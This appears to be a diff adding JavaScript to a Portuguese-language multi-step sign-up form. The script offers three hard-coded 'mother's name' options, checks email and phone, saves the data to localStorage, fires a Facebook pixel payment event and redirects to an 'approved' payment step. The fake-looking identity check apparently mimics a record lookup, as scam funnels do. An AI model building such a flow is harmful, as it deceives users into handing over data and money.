+            document.querySelectorAll('#page5 .option-button').forEach((btn, i) => {
+                const maes = ['Maria Silva Santos', 'Ana Costa Oliveira', 'Rita Lima Pereira'];
+                btn.textContent = maes[i];
+                btn.dataset.valor = maes[i];
+            });
+        }
+        
+        function selecionarOpcao(button, campo, index) {
+            const page = button.closest('.page');
+            page.querySelectorAll('.option-button').forEach(btn => btn.classList.remove('selected'));
+            button.classList.add('selected');
+            dadosUsuario[campo] = button.dataset.valor || button.textContent;
+            page.querySelector('.btn-confirmar').disabled = false;
+        }
+        
+        function formatarTelefone(tel) {
+            const nums = tel.replace(/\D/g, '');
+            if (nums.length === 11) {
+                return `(${nums.substr(0,2)}) ${nums.substr(2,5)}-${nums.substr(7,4)}`;
+            }
+            return tel;
+        }
+        
+        function proximaEtapa(proximaPagina) {
+            const paginaAtual = document.querySelector('.page.active').id.replace('page', '');
+            
+            if (proximaPagina === 8) {
+                // Valida email
+                const email = document.getElementById('emailInput').value;
+                if (!email || !email.includes('@')) {
+                    document.getElementById('emailError').style.display = 'block';
+                    return;
+                }
+                dadosUsuario.email = email;
+            }
+            
+            mudarPagina(parseInt(paginaAtual), proximaPagina);
+        }
+        
+        function finalizarCadastro() {
+            const telefone = document.getElementById('telefoneInput').value;
+            const telLimpo = telefone.replace(/\D/g, '');
+            
+            if (telLimpo.length < 10) {
+                document.getElementById('telefoneError').style.display = 'block';
+                return;
+            }
+            
+            dadosUsuario.telefone = telefone;
+            
+            // Salva tudo
+            localStorage.setItem('dadosCompletos', JSON.stringify(dadosUsuario));
+            localStorage.setItem('nome', dadosUsuario.nome || '');
+            localStorage.setItem('telefone', telefone);
+            localStorage.setItem('email', dadosUsuario.email || '');
+            
+            // Dispara evento
+            if (typeof fbq !== 'undefined') {
+                fbq('track', 'AddPaymentInfo');
+            }
+            
+            // Vai pro pagamento
+            window.location.href = 'aprovado%20etapa%205/index.html';
+        }
     </script>
 </body>
 </html>
